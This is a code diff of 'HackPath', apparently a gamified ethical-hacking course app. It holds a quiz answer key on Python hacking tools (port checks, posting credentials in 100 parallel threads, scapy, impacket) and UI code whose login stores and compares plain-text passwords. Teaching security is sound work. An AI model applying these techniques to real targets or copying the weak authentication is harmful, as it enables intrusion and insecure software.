+      {id:"u14l8",title:"Mastery Test: Python Hacking Tools",rounds:[
+        {type:"type",q:"Create a TCP socket:",a:["socket.socket(socket.AF_INET, socket.SOCK_STREAM)","s = socket.socket()","socket.socket()"],why:"AF_INET=IPv4, SOCK_STREAM=TCP."},
+        {type:"type",q:"Check if port is open with connect_ex:",a:["s.connect_ex((ip, port)) == 0","if s.connect_ex((target,port))==0:"],why:"0 = connection successful = port open."},
+        {type:"type",q:"Send a POST request with credentials:",a:["requests.post(url, data={'user':'admin','pass':'test'})","r = requests.post(url, data=creds)"],why:"requests.post with data dict."},
+        {type:"type",q:"Run 100 tasks in parallel:",a:["ThreadPoolExecutor(max_workers=100)","with ThreadPoolExecutor(100) as ex: ex.map(fn, items)"],why:"ThreadPoolExecutor runs tasks in parallel threads."},
+        {type:"type",q:"Parse HTML and find all forms:",a:["soup.find_all('form')","BeautifulSoup(html,'html.parser').find_all('form')"],why:"Forms reveal input fields and action URLs."},
+        {type:"type",q:"Set a 1-second timeout on a socket:",a:["s.settimeout(1)"],why:"Prevents hanging on closed ports."},
+        {type:"type",q:"Library for crafting raw network packets:",a:["scapy"],why:"Scapy creates and manipulates packets at any protocol layer."},
+        {type:"type",q:"Library for Windows protocol attacks (SMB, Kerberos):",a:["impacket"],why:"Impacket implements Windows networking protocols."}
+      ]}
+    ]
+  }
+];
+
+const ALL_UNITS = [...UNITS_1_4, ...UNITS_5_7, ...UNITS_8_10, ...UNITS_11_14];
+
+// ═══ STYLES ═══
+const CSS = `
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap');
+*{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0a0e17;--card:#111827;--card2:#1a2235;--border:#1e293b;--green:#22c55e;--greenDim:#166534;--red:#ef4444;--redDim:#7f1d1d;--blue:#3b82f6;--purple:#a855f7;--yellow:#eab308;--cyan:#06b6d4;--text:#e2e8f0;--textDim:#64748b;--gold:#fbbf24}
+body{background:var(--bg);color:var(--text);font-family:'Space Grotesk',sans-serif;overflow-x:hidden}
+.hp{min-height:100vh;display:flex;flex-direction:column;max-width:500px;margin:0 auto;padding:12px}
+.hdr{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--border);margin-bottom:12px;flex-wrap:wrap;gap:8px}
+.hdr h1{font-family:'JetBrains Mono',monospace;font-size:1.1rem;color:var(--green);letter-spacing:-0.5px}
+.btn{background:var(--green);color:#000;border:none;padding:10px 20px;border-radius:8px;font-weight:700;font-size:.9rem;cursor:pointer;font-family:'Space Grotesk',sans-serif;transition:transform .1s}
+.btn:active{transform:scale(.96)}
+.btn.sec{background:var(--card2);color:var(--text);border:1px solid var(--border)}
+.btn.sm{padding:6px 14px;font-size:.8rem}
+.btn.full{width:100%}
+.inp{background:var(--card);color:var(--text);border:1px solid var(--border);padding:10px 14px;border-radius:8px;font-size:.95rem;width:100%;font-family:'JetBrains Mono',monospace;outline:none}
+.inp:focus{border-color:var(--green)}
+.fadeIn{animation:fadeIn .3s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
+.slideUp{animation:slideUp .35s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.shake{animation:shake .4s ease}
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-8px)}40%{transform:translateX(8px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+.pulse{animation:pulse .5s ease}
+@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.08)}100%{transform:scale(1)}}
+.glow{box-shadow:0 0 20px rgba(34,197,94,.3)}
+.starPop{animation:starPop .5s ease}
+@keyframes starPop{0%{transform:scale(0) rotate(-180deg);opacity:0}70%{transform:scale(1.2) rotate(10deg);opacity:1}100%{transform:scale(1) rotate(0deg)}}
+.map-node{width:56px;height:56px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:1rem;cursor:pointer;transition:transform .2s;border:3px solid transparent;font-family:'JetBrains Mono',monospace}
+.map-node.done{background:var(--green);color:#000;border-color:#4ade80}
+.map-node.current{background:var(--card2);border-color:var(--green);color:var(--green);box-shadow:0 0 16px rgba(34,197,94,.4)}
+.map-node.locked{background:var(--card);border-color:var(--border);color:var(--textDim);cursor:default;opacity:.5}
+.map-unit{font-size:.7rem;color:var(--textDim);text-transform:uppercase;letter-spacing:1px;margin-top:24px;margin-bottom:8px;font-weight:600}
+.os-btn{padding:14px;border-radius:10px;border:2px solid var(--border);background:var(--card);cursor:pointer;text-align:center;transition:border-color .2s}
+.os-btn.sel{border-color:var(--green);background:var(--card2)}
+.round-card{background:var(--card);border-radius:12px;padding:18px;border:1px solid var(--border)}
+.teach-card{background:linear-gradient(135deg,#111827,#1a2235);border-left:3px solid var(--cyan)}
+.opt-btn{display:block;width:100%;text-align:left;padding:12px 16px;background:var(--card2);border:1px solid var(--border);border-radius:8px;color:var(--text);font-size:.9rem;cursor:pointer;margin:6px 0;transition:border-color .15s;font-family:'Space Grotesk',sans-serif}
+.opt-btn:hover{border-color:var(--blue)}
+.opt-btn.correct{border-color:var(--green);background:var(--greenDim)}
+.opt-btn.wrong{border-color:var(--red);background:var(--redDim)}
+.order-item{display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--card2);border:1px solid var(--border);border-radius:8px;margin:4px 0;font-size:.9rem}
+.order-btns{display:flex;flex-direction:column;gap:2px}
+.order-btns button{background:var(--card);border:1px solid var(--border);color:var(--text);width:28px;height:24px;border-radius:4px;cursor:pointer;font-size:.7rem;display:flex;align-items:center;justify-content:center}
+.match-item{padding:10px 14px;background:var(--card2);border:2px solid var(--border);border-radius:8px;cursor:pointer;font-size:.85rem;text-align:center;transition:border-color .15s}
+.match-item.sel{border-color:var(--blue)}
+.match-item.done{border-color:var(--green);opacity:.5}
+.progress-bar{height:6px;background:var(--card);border-radius:3px;overflow:hidden;margin:8px 0}
+.progress-fill{height:100%;background:var(--green);transition:width .3s;border-radius:3px}
+.os-tab{padding:6px 12px;border-radius:6px;font-size:.75rem;cursor:pointer;border:1px solid var(--border);background:var(--card);color:var(--textDim);font-family:'JetBrains Mono',monospace}
+.os-tab.active{background:var(--card2);border-color:var(--green);color:var(--green)}
+.xp-badge{background:var(--card2);border:1px solid var(--border);border-radius:6px;padding:4px 10px;font-size:.75rem;color:var(--gold);font-weight:600;font-family:'JetBrains Mono',monospace}
+.lab-term{background:#000;border-radius:8px;padding:12px;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;max-height:260px;overflow-y:auto;border:1px solid #1a3a1a}
+.lab-term .prompt{color:#22c55e}
+.lab-term .output{color:#94a3b8;white-space:pre-wrap}
+.lab-term .hint{color:#eab308;font-style:italic}
+.lab-term .success{color:#22c55e;font-weight:700}
+.lab-term .fail{color:#ef4444}
+.lab-input{display:flex;gap:6px;align-items:center;margin-top:8px}
+.lab-input span{color:var(--green);font-family:'JetBrains Mono',monospace;font-size:.8rem}
+.lab-input input{flex:1;background:#0a0a0a;border:1px solid #1a3a1a;color:var(--green);font-family:'JetBrains Mono',monospace;font-size:.82rem;padding:8px 10px;border-radius:6px;outline:none}
+.lab-input input:focus{border-color:var(--green)}
+.lab-objective{background:var(--card2);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-size:.85rem}
+.lab-objective strong{color:var(--cyan)}
+.lab-step-badge{display:inline-block;background:var(--greenDim);color:var(--green);padding:2px 8px;border-radius:4px;font-size:.7rem;font-weight:700}
+`;
+const ALL_LEVELS = ALL_UNITS.flatMap(u => u.levels.map(l => ({ ...l, unitId: u.id, unitTitle: u.title })));
+const PATH = ALL_LEVELS.map(l => l.id);
+
+// ═══ COMPONENTS ═══
+
+const Auth = ({ onLogin }) => {
+  const [mode, setMode] = useState("login");
+  const [user, setUser] = useState("");
+  const [pass, setPass] = useState("");
+  const [err, setErr] = useState("");
+  const [loading, setLoading] = useState(false);
+  const submit = async () => {
+    if (!user.trim() || !pass.trim()) return setErr("Fill in both fields");
+    const nameErr = checkUsername(user.trim());
+    if (nameErr && mode === "register") return setErr(nameErr);
+    if (pass.length < 3) return setErr("Password must be at least 3 characters");
+    setLoading(true); setErr("");
+    if (mode === "register") {
+      const exists = await checkU(user.trim());
+      if (exists) { setLoading(false); return setErr("That username is already taken \u2014 try another"); }
+      await saveU(user.trim(), pass);
+      onLogin(user.trim());
+    } else {
+      const stored = await checkU(user.trim());
+      if (!stored || stored !== pass) { setLoading(false); return setErr("Wrong credentials"); }
+      onLogin(user.trim());
+    }
+  };
+  return (
+    <div className="hp" style={{ justifyContent: "center", gap: 20, minHeight: "100vh" }}>
+      <div style={{ textAlign: "center" }}>
+        <div style={{ fontSize: "2.5rem", fontFamily: "JetBrains Mono", fontWeight: 800, color: "var(--green)" }}>{">"}_HackPath</div>
+        <div style={{ color: "var(--textDim)", marginTop: 8 }}>Learn ethical hacking from zero to bug bounty</div>
+      </div>
+      <div className="round-card" style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+        <div style={{ display: "flex", gap: 8 }}>
+          <button className={`btn sm ${mode === "login" ? "" : "sec"}`} onClick={() => { setMode("login"); setErr(""); }}>Login</button>
+          <button className={`btn sm ${mode === "register" ? "" : "sec"}`} onClick={() => { setMode("register"); setErr(""); }}>Register</button>
+        </div>
+        <input className="inp" placeholder="Username" value={user} onChange={e => setUser(e.target.value)} onKeyDown={e => e.key === "Enter" && submit()} />
+        <input className="inp" type="password" placeholder="Password" value={pass} onChange={e => setPass(e.target.value)} onKeyDown={e => e.key === "Enter" && submit()} />
+        {err && <div style={{ color: "var(--red)", fontSize: ".85rem" }}>{err}</div>}
+        <button className="btn full" onClick={submit} disabled={loading}>{loading ? "..." : mode === "login" ? "Login" : "Register"}</button>
+      </div>
+      <button className="btn sec full" onClick={() => onLogin("guest")} style={{ opacity: 0.7 }}>Skip — just let me try it</button>
+    </div>
+  );
+};
+
+const OSPicker = ({ onSelect }) => {
+  const [sel, setSel] = useState([]);
+  const toggle = (os) => setSel(p => p.includes(os) ? p.filter(x => x !== os) : [...p, os]);
+  const oses = [{ id: "linux", icon: "\uD83D\uDC27", name: "Linux / Kali" }, { id: "windows", icon: "\uD83E\uDE9F", name: "Windows" }, { id: "mac", icon: "\uD83C\uDF4E", name: "macOS" }];
+  return (
+    <div className="hp" style={{ justifyContent: "center", gap: 20, minHeight: "100vh" }}>
+      <div style={{ textAlign: "center" }}>
+        <div style={{ fontSize: "1.3rem", fontWeight: 700 }}>What OS are you learning on?</div>
+        <div style={{ color: "var(--textDim)", fontSize: ".85rem", marginTop: 4 }}>Pick one or more. Change anytime.</div>
+      </div>
+      <div style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+        {oses.map(o => (
+          <div key={o.id} className={`os-btn ${sel.includes(o.id) ? "sel" : ""}`} onClick={() => { SFX.tap(); toggle(o.id); }}>
+            <div style={{ fontSize: "1.5rem" }}>{o.icon}</div>
+            <div style={{ fontWeight: 600, marginTop: 4 }}>{o.name}</div>
+          </div>
+        ))}
+      </div>
+      <button className="btn full" disabled={!sel.length} onClick={() => onSelect(sel)}>Continue</button>
+    </div>
+  );
+};
+
+const TeachCard = ({ round, userOS, onDone }) => {
+  const [activeOS, setActiveOS] = useState(userOS?.[0] || "linux");
+  const hasOS = round.os && typeof round.os === "object";
+  return (
+    <div className="round-card teach-card slideUp" style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+      <div style={{ fontSize: ".7rem", color: "var(--cyan)", fontWeight: 700, textTransform: "uppercase", letterSpacing: 1 }}>LEARN</div>
+      <div style={{ fontSize: ".92rem", lineHeight: 1.6, whiteSpace: "pre-wrap" }}>{round.text}</div>
+      {hasOS && (
+        <div>
+          <div style={{ display: "flex", gap: 6, marginBottom: 8 }}>
+            {userOS?.map(os => (
+              <button key={os} className={`os-tab ${activeOS === os ? "active" : ""}`} onClick={() => setActiveOS(os)}>{os}</button>
+            ))}
+          </div>
+          <div style={{ background: "var(--bg)", padding: 10, borderRadius: 8, fontFamily: "JetBrains Mono", fontSize: ".8rem", whiteSpace: "pre-wrap", color: "var(--green)", lineHeight: 1.6 }}>
+            {round.os[activeOS] || round.os.linux || "Same as Linux"}
+          </div>
+        </div>
+      )}
+      <button className="btn full" onClick={onDone}>Got it</button>
+    </div>
+  );
+};
+
+const PickRound = ({ round, onResult }) => {
+  const [answered, setAnswered] = useState(false);
+  const [selected, setSelected] = useState(null);
+  const shuffled = useMemo(() => shuffle(round.opts), [round.q]);
+  const pick = (opt) => {
+    if (answered) return;
+    setSelected(opt); setAnswered(true);
+    opt === round.a ? SFX.correct() : SFX.wrong();
+    setTimeout(() => onResult(opt === round.a), 1200);
+  };
+  return (
+    <div className="round-card slideUp" style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      {shuffled.map(opt => (
+        <button key={opt} className={`opt-btn ${answered ? (opt === round.a ? "correct pulse" : opt === selected ? "wrong shake" : "") : ""}`} onClick={() => pick(opt)}>{opt}</button>
+      ))}
+      {answered && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const TFRound = ({ round, onResult }) => {
+  const [answered, setAnswered] = useState(false);
+  const [selected, setSelected] = useState(null);
+  const pick = (val) => {
+    if (answered) return;
+    setSelected(val); setAnswered(true);
+    val === round.a ? SFX.correct() : SFX.wrong();
+    setTimeout(() => onResult(val === round.a), 1200);
+  };
+  return (
+    <div className="round-card slideUp" style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      <div style={{ display: "flex", gap: 8 }}>
+        {[true, false].map(v => (
+          <button key={String(v)} style={{ flex: 1 }} className={`opt-btn ${answered ? (v === round.a ? "correct pulse" : v === selected ? "wrong shake" : "") : ""}`} onClick={() => pick(v)}>{v ? "True" : "False"}</button>
+        ))}
+      </div>
+      {answered && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const TypeRound = ({ round, onResult }) => {
+  const [val, setVal] = useState("");
+  const [answered, setAnswered] = useState(false);
+  const [correct, setCorrect] = useState(false);
+  const check = () => {
+    if (answered || !val.trim()) return;
+    const c = round.a.some(a => val.trim().toLowerCase() === a.toLowerCase());
+    setCorrect(c); setAnswered(true);
+    c ? SFX.correct() : SFX.wrong();
+    setTimeout(() => onResult(c), 1200);
+  };
+  return (
+    <div className={`round-card slideUp ${answered ? (correct ? "glow" : "shake") : ""}`} style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      <input className="inp" value={val} onChange={e => setVal(e.target.value)} onKeyDown={e => e.key === "Enter" && check()} placeholder="Type your answer..." autoFocus disabled={answered} />
+      {!answered && <button className="btn full" onClick={check}>Check</button>}
+      {answered && !correct && <div style={{ fontSize: ".85rem", color: "var(--green)" }}>Answer: <strong>{round.a[0]}</strong></div>}
+      {answered && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const FillRound = ({ round, onResult }) => {
+  const [val, setVal] = useState("");
+  const [answered, setAnswered] = useState(false);
+  const [correct, setCorrect] = useState(false);
+  const check = () => {
+    if (answered || !val.trim()) return;
+    const c = round.a.some(a => val.trim().toLowerCase() === a.toLowerCase());
+    setCorrect(c); setAnswered(true);
+    c ? SFX.correct() : SFX.wrong();
+    setTimeout(() => onResult(c), 1200);
+  };
+  return (
+    <div className={`round-card slideUp ${answered ? (correct ? "glow" : "shake") : ""}`} style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      <input className="inp" value={val} onChange={e => setVal(e.target.value)} onKeyDown={e => e.key === "Enter" && check()} placeholder="Fill in..." autoFocus disabled={answered} />
+      {!answered && <button className="btn full" onClick={check}>Check</button>}
+      {answered && !correct && <div style={{ fontSize: ".85rem", color: "var(--green)" }}>Answer: <strong>{round.a[0]}</strong></div>}
+      {answered && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const OrderRound = ({ round, onResult }) => {
+  const [items, setItems] = useState(() => shuffle(round.items));
+  const [answered, setAnswered] = useState(false);
+  const [correct, setCorrect] = useState(false);
+  const move = (i, dir) => {
+    if (answered) return; SFX.tap();
+    const a = [...items]; const ni = i + dir;
+    if (ni < 0 || ni >= a.length) return;
+    [a[i], a[ni]] = [a[ni], a[i]]; setItems(a);
+  };
+  const check = () => {
+    const c = items.every((item, i) => item === round.items[i]);
+    setCorrect(c); setAnswered(true);
+    c ? SFX.correct() : SFX.wrong();
+    if (!c) setTimeout(() => setItems(round.items), 600);
+    setTimeout(() => onResult(c), 1400);
+  };
+  return (
+    <div className={`round-card slideUp ${answered ? (correct ? "pulse glow" : "shake") : ""}`} style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      {items.map((item, i) => (
+        <div key={item} className="order-item">
+          <span style={{ color: "var(--textDim)", fontSize: ".8rem", width: 20 }}>{i + 1}.</span>
+          <span style={{ flex: 1 }}>{item}</span>
+          <div className="order-btns">
+            <button onClick={() => move(i, -1)}>&#9650;</button>
+            <button onClick={() => move(i, 1)}>&#9660;</button>
+          </div>
+        </div>
+      ))}
+      {!answered && <button className="btn full" onClick={check}>Check Order</button>}
+      {answered && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const MatchRound = ({ round, onResult }) => {
+  const [selL, setSelL] = useState(null);
+  const [matched, setMatched] = useState({});
+  const [wrong, setWrong] = useState(null);
+  const [complete, setComplete] = useState(false);
+  const rightItems = useMemo(() => shuffle(round.pairs.map(p => p[1])), [round.q]);
+
+  const tapL = (l) => { if (matched[l] || complete) return; SFX.tap(); setSelL(selL === l ? null : l); setWrong(null); };
+  const tapR = (r) => {
+    if (!selL || Object.values(matched).includes(r) || complete) return;
+    const pair = round.pairs.find(p => p[0] === selL);
+    if (pair && pair[1] === r) {
+      const newMatched = { ...matched, [selL]: r };
+      setMatched(newMatched);
+      setSelL(null);
+      SFX.tap();
+      if (Object.keys(newMatched).length === round.pairs.length) {
+        setComplete(true);
+        SFX.correct();
+        setTimeout(() => onResult(true), 1000);
+      }
+    } else {
+      SFX.wrong(); setWrong(r); setTimeout(() => setWrong(null), 600);
+    }
+  };
+
+  return (
+    <div className="round-card slideUp" style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      <div style={{ fontSize: ".75rem", color: "var(--textDim)", marginBottom: 2 }}>Tap a left item, then tap its match on the right</div>
+      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
+        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+          {round.pairs.map(p => {
+            const isDone = !!matched[p[0]];
+            const isSel = selL === p[0];
+            return (
+              <div key={p[0]} onClick={() => tapL(p[0])} style={{
+                padding: "10px 14px", borderRadius: 8, cursor: isDone ? "default" : "pointer", fontSize: ".85rem", textAlign: "center",
+                background: isDone ? "var(--greenDim)" : isSel ? "var(--card2)" : "var(--card2)",
+                border: `2px solid ${isDone ? "var(--green)" : isSel ? "var(--blue)" : "var(--border)"}`,
+                color: isDone ? "var(--green)" : "var(--text)",
+                transition: "all .15s"
+              }}>{isDone ? "\u2713 " : ""}{p[0]}</div>
+            );
+          })}
+        </div>
+        <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
+          {rightItems.map(r => {
+            const isDone = Object.values(matched).includes(r);
+            const isWrong = wrong === r;
+            return (
+              <div key={r} onClick={() => tapR(r)} className={isWrong ? "shake" : ""} style={{
+                padding: "10px 14px", borderRadius: 8, cursor: isDone ? "default" : "pointer", fontSize: ".85rem", textAlign: "center",
+                background: isDone ? "var(--greenDim)" : "var(--card2)",
+                border: `2px solid ${isDone ? "var(--green)" : isWrong ? "var(--red)" : "var(--border)"}`,
+                color: isDone ? "var(--green)" : "var(--text)",
+                transition: "all .15s"
+              }}>{isDone ? "\u2713 " : ""}{r}</div>
+            );
+          })}
+        </div>
+      </div>
+      {complete && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const BuildRound = ({ round, onResult }) => {
+  const [built, setBuilt] = useState([]);
+  const [avail, setAvail] = useState(() => shuffle(round.parts));
+  const [answered, setAnswered] = useState(false);
+  const [correct, setCorrect] = useState(false);
+  const add = (part) => { if (answered) return; SFX.tap(); setBuilt(p => [...p, part]); setAvail(p => { const i = p.indexOf(part); const a = [...p]; a.splice(i, 1); return a; }); };
+  const remove = (i) => { if (answered) return; const part = built[i]; setBuilt(p => { const a = [...p]; a.splice(i, 1); return a; }); setAvail(p => [...p, part]); };
+  const check = () => {
+    const c = built.join(" ") === round.answer.join(" ");
+    setCorrect(c); setAnswered(true);
+    c ? SFX.correct() : SFX.wrong();
+    setTimeout(() => onResult(c), 1200);
+  };
+  return (
+    <div className={`round-card slideUp ${answered ? (correct ? "glow" : "shake") : ""}`} style={{ display: "flex", flexDirection: "column", gap: 10 }}>
+      <div style={{ fontWeight: 600, fontSize: ".95rem" }}>{round.q}</div>
+      <div style={{ minHeight: 44, background: "var(--bg)", borderRadius: 8, padding: 10, display: "flex", flexWrap: "wrap", gap: 6, fontFamily: "JetBrains Mono", fontSize: ".82rem" }}>
+        {built.map((p, i) => (
+          <span key={i} onClick={() => remove(i)} style={{ background: "var(--card2)", padding: "4px 10px", borderRadius: 6, cursor: "pointer", border: "1px solid var(--border)" }}>{p}</span>
+        ))}
+        {!built.length && <span style={{ color: "var(--textDim)" }}>Tap parts to build...</span>}
+      </div>
+      <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
+        {avail.map((p, i) => (
+          <button key={i} onClick={() => add(p)} className="btn sm sec" style={{ fontFamily: "JetBrains Mono", fontSize: ".8rem" }}>{p}</button>
+        ))}
+      </div>
+      {!answered && built.length > 0 && <button className="btn full" onClick={check}>Check</button>}
+      {answered && !correct && <div style={{ fontSize: ".85rem", color: "var(--green)" }}>Correct: <strong style={{ fontFamily: "JetBrains Mono" }}>{round.answer.join(" ")}</strong></div>}
+      {answered && <div style={{ fontSize: ".82rem", color: "var(--textDim)" }}>{round.why}</div>}
+    </div>
+  );
+};
+
+const LabRound = ({ round, onResult }) => {
+  const [step, setStep] = useState(0);
+  const [input, setInput] = useState("");
+  const [history, setHistory] = useState([]);
+  const [done, setDone] = useState(false);
+  const termRef = useRef(null);
+  const steps = round.steps;
+  const cur = steps[step];
+
+  useEffect(() => {
+    if (termRef.current) termRef.current.scrollTop = termRef.current.scrollHeight;
+  }, [history]);
+
+  useEffect(() => {
+    setHistory([{ type: "hint", text: `\uD83C\uDFAF Objective: ${round.objective}` }, { type: "hint", text: `\u27A1\uFE0F Step ${step + 1}/${steps.length}: ${cur.hint}` }]);
+  }, []);
+
+  const runCmd = () => {
+    if (done || !input.trim()) return;
+    const cmd = input.trim();
+    setInput("");
+    const newHist = [...history, { type: "prompt", text: `$ ${cmd}` }];
+    const accepts = cur.accept.some(a => {
+      if (a.startsWith("~")) return cmd.toLowerCase().includes(a.slice(1).toLowerCase());
+      return cmd.toLowerCase().replace(/\s+/g, " ") === a.toLowerCase();
+    });
+    if (accepts) {
+      SFX.correct();
+      newHist.push({ type: "output", text: cur.output });
+      if (cur.successMsg) newHist.push({ type: "success", text: `\u2705 ${cur.successMsg}` });
+      if (step + 1 >= steps.length) {
+        newHist.push({ type: "success", text: `\n\uD83C\uDF89 Lab Complete! All objectives achieved.` });
+        setHistory(newHist);
+        setDone(true);
+        SFX.complete();
+        setTimeout(() => onResult(true), 1500);
+      } else {
+        const next = steps[step + 1];
+        newHist.push({ type: "hint", text: `\n\u27A1\uFE0F Step ${step + 2}/${steps.length}: ${next.hint}` });
+        setHistory(newHist);
+        setStep(step + 1);
+      }
+    } else {
+      SFX.wrong();
+      newHist.push({ type: "fail", text: cur.wrongMsg || "Not quite. Try again." });
+      if (cur.example) newHist.push({ type: "hint", text: `\uD83D\uDCA1 Try something like: ${cur.example}` });
+      setHistory(newHist);
+    }
+  };
+
+  return (
+    <div className="round-card slideUp" style={{ display: "flex", flexDirection: "column", gap: 10, borderColor: "#1a3a1a" }}>
+      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center" }}>
+        <div style={{ fontSize: ".7rem", color: "var(--green)", fontWeight: 700, textTransform: "uppercase", letterSpacing: 1 }}>{"\uD83D\uDDA5\uFE0F"} LAB: {round.title}</div>
+        <span className="lab-step-badge">{step + 1}/{steps.length}</span>
+      </div>
+      <div className="lab-objective"><strong>Objective:</strong> {round.objective}</div>
+      <div className="lab-term" ref={termRef}>
+        {round.banner && <div className="output">{round.banner}{"\n"}</div>}
+        {history.map((h, i) => (
+          <div key={i} className={h.type}>{h.text}</div>
+        ))}
+      </div>
+      {!done && (
+        <div className="lab-input">
+          <span>$</span>
+          <input value={input} onChange={e => setInput(e.target.value)} onKeyDown={e => e.key === "Enter" && runCmd()} placeholder={cur.placeholder || "Type command..."} autoFocus />
+          <button className="btn sm" onClick={runCmd}>Run</button>
+        </div>
+      )}
+      {!done && cur.quickCmds && (
+        <div style={{ display: "flex", flexWrap: "wrap", gap: 4 }}>
+          {cur.quickCmds.map((c, i) => (
+            <button key={i} className="btn sm sec" style={{ fontFamily: "JetBrains Mono", fontSize: ".72rem", padding: "4px 8px" }} onClick={() => { setInput(c); }}>{c}</button>
+          ))}
+        </div>
+      )}
+    </div>
+  );
+};
+
+const LessonSession = ({ level, userOS, onComplete }) => {
+  const [ri, setRi] = useState(0);
+  const [scores, setScores] = useState([]);
+  const [showResult, setShowResult] = useState(false);
+  const rounds = level.rounds;
+  const round = rounds[ri];
+  const scoreable = rounds.filter(r => r.type !== "teach");
+  const handleResult = (correct) => {
+    setScores(p => [...p, correct]);
+    setTimeout(() => { if (ri + 1 >= rounds.length) setShowResult(true); else setRi(ri + 1); }, 300);
+  };
+  const handleTeachDone = () => { if (ri + 1 >= rounds.length) setShowResult(true); else setRi(ri + 1); };
+  if (showResult) {
+    const correctCount = scores.filter(Boolean).length;
+    const total = scoreable.length;
+    const pct = total > 0 ? correctCount / total : 1;
+    const passed = pct >= 0.7;
+    const stars = pct >= 0.95 ? 3 : pct >= 0.8 ? 2 : 1;
+    if (passed) SFX.complete();
+    return (
+      <div className="round-card fadeIn" style={{ textAlign: "center", display: "flex", flexDirection: "column", gap: 14, alignItems: "center" }}>
+        <div style={{ fontSize: "1.5rem", fontWeight: 800 }}>{passed ? "Level Complete!" : "Not quite \u2014 try again!"}</div>
+        <div style={{ color: "var(--textDim)" }}>{correctCount}/{total} correct</div>
+        {passed && <div style={{ display: "flex", gap: 8 }}>{[1, 2, 3].map(s => (
+          <span key={s} className={s <= stars ? "starPop" : ""} style={{ fontSize: "2rem", animationDelay: `${s * 0.15}s`, opacity: s <= stars ? 1 : 0.2 }}>{"\u2B50"}</span>
+        ))}</div>}
+        <div style={{ fontSize: ".85rem", color: "var(--textDim)" }}>{passed ? `+${correctCount * 10} XP` : "Need 70% to pass"}</div>
+        <button className="btn full" onClick={() => onComplete(passed, passed ? stars : 0, correctCount * 10)}>{passed ? "Continue" : "Retry"}</button>
+      </div>
+    );
+  }
+  const progress = (ri / rounds.length) * 100;
+  return (
+    <div style={{ display: "flex", flexDirection: "column", gap: 12 }}>
+      <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
+        <button className="btn sm sec" onClick={() => onComplete(false, 0, 0)}>{"\u2715"}</button>
+        <div style={{ flex: 1 }}><div className="progress-bar"><div className="progress-fill" style={{ width: `${progress}%` }} /></div></div>
+        <span style={{ fontSize: ".75rem", color: "var(--textDim)" }}>{ri + 1}/{rounds.length}</span>
+      </div>
+      {round.type === "teach" && <TeachCard key={ri} round={round} userOS={userOS} onDone={handleTeachDone} />}
+      {round.type === "pick" && <PickRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "tf" && <TFRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "type" && <TypeRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "fillin" && <FillRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "order" && <OrderRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "match" && <MatchRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "build" && <BuildRound key={ri} round={round} onResult={handleResult} />}
+      {round.type === "lab" && <LabRound key={ri} round={round} onResult={handleResult} />}
+    </div>
+  );
+};
+
+// ═══ MAIN APP ═══
+export default function HackPath() {
+  const [user, setUser] = useState(null);
+  const [userOS, setUserOS] = useState(null);
+  const [progress, setProgress] = useState({});
+  const [active, setActive] = useState(null);
+  const [loaded, setLoaded] = useState(false);
+
+  const loginUser = useCallback(async (username) => {
+    setUser(username);
+    const p = await loadP(username); if (p) setProgress(p);
+    const o = await loadOS(username); if (o) setUserOS(o);
+    setLoaded(true);
+  }, []);
+
+  useEffect(() => { if (user && loaded) saveP(user, progress); }, [progress, user, loaded]);
+
+  const nextLevel = useMemo(() => { for (const id of PATH) { if (!progress[id]?.passed) return id; } return null; }, [progress]);
+  const totalXP = useMemo(() => Object.values(progress).reduce((s, p) => s + (p.xp || 0), 0), [progress]);
+
+  const handleComplete = (passed, stars, xp) => {
